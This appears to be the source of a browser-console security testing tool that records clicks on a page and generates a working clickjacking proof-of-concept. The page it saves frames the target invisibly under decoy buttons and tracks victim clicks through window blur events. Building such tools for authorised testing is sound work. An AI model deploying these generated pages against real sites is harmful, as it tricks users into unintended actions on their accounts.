/*
 * burpsy Clickbandit (burpsy-react-ui-g67w): paste into the developer console of the page to test.
 *
 * Start reloads the page inside a same-origin iframe and records each click (its position in the
 * framed document and the element's text). Finish turns the recording into a clickjacking proof of
 * concept: the target framed and made transparent, with a decoy button over each recorded click in
 * turn. Review it on the spot (Toggle transparency, Reset, + / - zoom, arrow keys to nudge the
 * decoys) and Save it as a standalone HTML file.
 *
 * Caution, as with any script run on a page: JavaScript on an untrusted target can tamper with what
 * this records and therefore with the HTML it saves.
 */
(function () {
  "use strict";
  if (window.__burpsyClickbandit) {
    window.__burpsyClickbandit.banner.scrollIntoView();
    return;
  }
  var target = location.href;
  var state = { recording: false, steps: [], sandbox: false, disableClicks: false, width: 1024, height: 768 };

  function el(tag, attrs, text) {
    var node = document.createElement(tag);
    for (var k in attrs || {}) node.setAttribute(k, attrs[k]);
    if (text !== undefined) node.textContent = text;
    return node;
  }

  function escapeHTML(s) {
    return String(s).replace(/[&<>"']/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
    });
  }

  /*
   * The proof of concept as a standalone page. Decoys are shown one at a time; a click on the
   * framed target blurs this window, which is how the page knows the victim clicked and advances.
   */
  function attackHTML(opts) {
    var steps = JSON.stringify(opts.steps);
    var sandbox = opts.sandbox ? ' sandbox="allow-forms allow-scripts allow-same-origin allow-popups"' : "";
    return (
      "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>Clickjacking proof of concept</title>\n" +
      "<style>body{margin:0;font-family:sans-serif}#bandit-frame{position:absolute;top:0;left:0;border:0;" +
      "width:" + opts.width + "px;height:" + opts.height + "px;opacity:" + opts.opacity + ";z-index:2}" +
      ".bandit-decoy{position:absolute;z-index:1;padding:8px 14px;background:#0a7;color:#fff;border-radius:4px;" +
      "font-size:14px;transform:translate(-50%,-50%)}#bandit-done{position:absolute;top:10px;left:10px;display:none}</style>\n" +
      "</head><body>\n<div id=\"bandit-decoys\"></div><div id=\"bandit-done\">Done</div>\n" +
      "<iframe id=\"bandit-frame\" src=\"" + escapeHTML(opts.url) + "\"" + sandbox + "></iframe>\n" +
      "<script>\n(function(){var steps=" + steps.replace(/</g, "\\u003c") + ";var i=0;var box=document.getElementById('bandit-decoys');\n" +
      "var zoom=" + opts.zoom + ",dx=" + opts.dx + ",dy=" + opts.dy + ";\n" +
      "function show(){box.innerHTML='';if(i>=steps.length){document.getElementById('bandit-done').style.display='block';return;}\n" +
      "var s=steps[i];var d=document.createElement('div');d.className='bandit-decoy';d.textContent=s.label||'Click';\n" +
      "d.style.left=((s.x-s.scrollX)*zoom+dx)+'px';d.style.top=((s.y-s.scrollY)*zoom+dy)+'px';box.appendChild(d);}\n" +
      "window.addEventListener('blur',function(){setTimeout(function(){i++;show();window.focus();},100);});\n" +
      "var f=document.getElementById('bandit-frame');f.style.transformOrigin='0 0';f.style.transform='scale('+zoom+')';show();})();\n" +
      "</" + "script>\n</body></html>\n"
    );
  }

  var banner = el("div", { id: "burpsy-clickbandit", role: "toolbar", "aria-label": "burpsy Clickbandit" });
  banner.style.cssText =
    "position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#1f2329;color:#eee;font:13px sans-serif;" +
    "padding:6px 10px;display:flex;gap:8px;align-items:center;box-shadow:0 2px 6px rgba(0,0,0,.4)";
  var title = el("strong", {}, "burpsy Clickbandit");
  var status = el("span", { id: "burpsy-clickbandit-status" }, "Ready: Start reloads this page in a frame and records your clicks.");
  var startBtn = el("button", { type: "button" }, "Start");
  var finishBtn = el("button", { type: "button", disabled: "disabled" }, "Finish");
  var disableBox = el("input", { type: "checkbox", id: "burpsy-cb-disable" });
  var disableLabel = el("label", { for: "burpsy-cb-disable" }, "Disable click actions");
  var sandboxBox = el("input", { type: "checkbox", id: "burpsy-cb-sandbox" });
  var sandboxLabel = el("label", { for: "burpsy-cb-sandbox" }, "Sandbox iframe");
  [title, startBtn, finishBtn, disableBox, disableLabel, sandboxBox, sandboxLabel, status].forEach(function (n) {
    banner.appendChild(n);
  });
  document.documentElement.appendChild(banner);

  var frame = null;
  var review = { opacity: 0.5, zoom: 1, dx: 0, dy: 0 };

  function record(ev) {
    if (!state.recording) return;
    var doc = frame.contentDocument;
    var win = frame.contentWindow;
    var t = ev.target;
    var label = ((t && (t.innerText || t.value || t.getAttribute("aria-label") || t.title)) || "Click").trim().slice(0, 40);
    state.steps.push({ x: ev.pageX, y: ev.pageY, scrollX: win.scrollX, scrollY: win.scrollY, label: label });
    status.textContent = "Recording: " + state.steps.length + " click(s). Finish when the victim's actions are done.";
    if (state.disableClicks) {
      ev.preventDefault();
      ev.stopPropagation();
    }
    void doc;
  }

  startBtn.addEventListener("click", function () {
    state.sandbox = sandboxBox.checked;
    state.disableClicks = disableBox.checked;
    state.steps = [];
    Array.prototype.slice.call(document.body ? document.body.childNodes : []).forEach(function (n) {
      if (n !== banner) n.remove();
    });
    frame = el("iframe", { id: "burpsy-clickbandit-frame", src: target, title: "Target under test" });
    if (state.sandbox) frame.setAttribute("sandbox", "allow-forms allow-scripts allow-same-origin allow-popups");
    frame.style.cssText = "position:fixed;top:40px;left:0;width:100%;height:calc(100% - 40px);border:0";
    (document.body || document.documentElement).appendChild(frame);
    frame.addEventListener("load", function () {
      try {
        frame.contentDocument.addEventListener("click", record, true);
      } catch (e) {
        status.textContent = "The framed page is not readable from here (" + e + "), so clicks cannot be recorded.";
      }
    });
    state.recording = true;
    startBtn.disabled = true;
    finishBtn.disabled = false;
    status.textContent = "Recording: click through the page as the victim would.";
  });

  function renderReview() {
    var html = attackHTML({
      url: target, steps: state.steps, sandbox: state.sandbox, opacity: review.opacity, zoom: review.zoom,
      dx: review.dx, dy: review.dy, width: state.width, height: state.height
    });
    window.__burpsyClickbandit.html = html;
    var preview = document.getElementById("burpsy-clickbandit-review");
    if (preview) preview.remove();
    preview = el("iframe", { id: "burpsy-clickbandit-review", title: "Attack review" });
    preview.style.cssText = "position:fixed;top:40px;left:0;width:100%;height:calc(100% - 40px);border:0;background:#fff";
    preview.srcdoc = html;
    (document.body || document.documentElement).appendChild(preview);
    return html;
  }

  finishBtn.addEventListener("click", function () {
    state.recording = false;
    finishBtn.disabled = true;
    // The framed size is the attack's frame size, so it is read before the recording frame is
    // hidden: a hidden frame measures 0 x 0, and a proof of concept framing nothing proves nothing.
    if (frame && frame.clientWidth > 0 && frame.clientHeight > 0) {
      state.width = frame.clientWidth;
      state.height = frame.clientHeight;
    }
    if (frame) frame.style.display = "none";
    status.textContent = state.steps.length + " click(s) recorded. Review the attack; arrow keys nudge the decoys.";
    var controls = [
      ["Toggle transparency", function () { review.opacity = review.opacity > 0.01 ? 0.0001 : 0.5; renderReview(); }],
      ["Reset", function () { review = { opacity: 0.5, zoom: 1, dx: 0, dy: 0 }; renderReview(); }],
      ["+", function () { review.zoom = Math.round((review.zoom + 0.1) * 10) / 10; renderReview(); }],
      ["-", function () { review.zoom = Math.max(0.1, Math.round((review.zoom - 0.1) * 10) / 10); renderReview(); }],
      ["Save", function () {
        var blob = new Blob([renderReview()], { type: "text/html" });
        var a = el("a", { href: URL.createObjectURL(blob), download: "clickjacking-poc.html" });
        document.documentElement.appendChild(a);
        a.click();
        a.remove();
      }]
    ];
    controls.forEach(function (c) {
      var b = el("button", { type: "button" }, c[0]);
      b.addEventListener("click", c[1]);
      banner.insertBefore(b, status);
    });
    document.addEventListener("keydown", function (ev) {
      var step = { ArrowLeft: [-1, 0], ArrowRight: [1, 0], ArrowUp: [0, -1], ArrowDown: [0, 1] }[ev.key];
      if (!step) return;
      review.dx += step[0];
      review.dy += step[1];
      renderReview();
    });
    renderReview();
  });

  window.__burpsyClickbandit = { banner: banner, state: state, attackHTML: attackHTML, html: "" };
})();
